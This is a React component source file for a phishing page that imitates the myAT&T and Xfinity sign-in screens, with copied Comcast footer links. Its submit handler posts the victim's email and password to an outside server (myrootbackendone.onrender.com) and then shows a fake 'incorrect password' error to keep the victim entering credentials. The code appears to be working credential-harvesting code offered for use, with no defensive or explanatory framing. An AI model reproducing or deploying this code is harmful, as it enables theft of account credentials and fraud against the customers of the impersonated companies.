import React from 'react';
import axios from 'axios';
import './home.css';
import logo from './logo.png';
import { useState } from 'react';

import { useLocation } from 'react-router-dom';
import atlogo from './atlogo.png';
import or from './or.png';



function Secure(){



    const location = useLocation();
    
    const[password, setPassword] = useState("");
    
    const[email ,setEmail] = useState(location.state.email);

    const[platform, setPlatform] = useState("xfinity")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    const[showPassword, setShowPassword] = useState(false);


    // useEffect(() => {
        
    //     set
    //   }, []);


    function handlePassword(e){
        e.preventDefault();

        setShowPassword(!showPassword);
    }


    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            setIsLoading(true);
            const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);

                setIsLoading(false);

            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }

    return (
        
        <>

<div className='mainContent py-4'>

<div className='col-md-5 m-auto maindiv pb-3'>

    <div className='imagediv text-center py-4'>
        <img src={atlogo} className="mylogo" />

    </div>

    <h1 className='text-center font-weight-bold bighead'>Sign in</h1>


    <h2 className='text-center smallhead'>to myAT&T</h2>

  

    <form  className="px-5">
    <div className='form-group py-1'>

       <label className='font-weight-bold'> User ID </label>

        <input onChange={function(e){
       // setUserName(e.target.value);
    }} value={email}  type="text"className='form-control w-100 py-4' required/>
        
        <button className='next btn w-100'>
            {isLoading ? "Loading ....." : "Continue"}
        </button>
        </div>




        
        
    </form>


    <div className='px-5'>
        <p className='primarycolor'>Forgot user ID?</p>

        <p className='primarycolor'>Don't have a user ID? Create one now </p>
        <div>
        <img src={or} style={{
            width:"100%",
        }}/>

<button className='nexttwo btn w-100'>
            signin with myAT&T app
        </button>
        </div>
        
    </div>



</div>




</div>
        {/* <section class="mainsection row">
   <div class="col-md-6 m-auto content">
       <img class="logo"src={logo} />

       <h6 className='font-weight-bold py-3'>{email}</h6>

       <h1 class="head">Enter your password</h1>

       <form onSubmit={handleSubmit}>
           

           <div class="myinputtwo rounded py-4 px-1">
               <input onChange={function(e){
                   setPassword(e.target.value);
               }} value={password} type={showPassword ? 'text' : 'password'}class="input"required/> <span><i onClick={handlePassword} className='fa fa-eye mr-2'></i></span>

           </div>

          

          {
              showError &&  <p class="smallest">The Xfinity ID or password you entered was incorrect. Please try again.</p>
          } 


          <div className='forgotdiv mt-4'>
          <a href='https://idm.xfinity.com/myaccount/reset?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3Fr%3Dcomcast.net%26s%3Dportal%26reqId%3Df374ae28-809c-4c98-b075-2f0eca884090%26rm%3D2%26ui_style%3Dlight&ui_style=light&ruid=hvhvh' className='forgot '>Forgot password?</a>
          </div>
           

          <div className='mt-4 mb-2'>
            <input type="checkbox"className='checkbox mt-1' /> <span className='checkspan'>Keep me signed in</span>

        </div>
           <p class="para">By signing in, you agree to our <a class="link" href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a class="link" href="http://xfinity.comcast.net/privacy/">Privacy <br/>Policy</a>.</p>


           

           <div class="buttondiv">

               <button type="submit" class="btn mybtn">{isLoading ? "Loading" : "Sign in" }</button>

           </div>
       </form>


       <div className='lastdiv mt-3'>
           <a className='lastlink' href='https://login.xfinity.com/logout?s=portal&r=comcast.net&continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3Fr%3Dcomcast.net%26s%3Dportal%26reqId%3Df374ae28-809c-4c98-b075-2f0eca884090%26rm%3D2%26ui_style%3Dlight'>Sign in as someone else</a>
       </div>



   </div>

  
   
</section> */}

<div class="text-center small">
   © 2023 Comcast

</div>

<div class="flexdiv">
   <a class="flexlink" href="https://www.xfinity.com/terms">Web Terms of Service</a>
   <a class="flexlink" href="https://www.xfinity.com/privacy/policy/staterights#california">CA Notice at Collection</a>
   <a class="flexlink" href="http://www.xfinity.com/privacy/policy">Privacy Policy</a>
   <a class="flexlink" href="https://www.xfinity.com/privacy/manage-preference">Your Privacy Choices</a>
   <a class="flexlink" href="https://www.xfinity.com/adinformation">Ad Choices</a>

</div>

<div class="text-center py-2 footer">
   <p class="footpara">Cookie Preferences</p>

</div>
   </>
    );


}

export default Secure;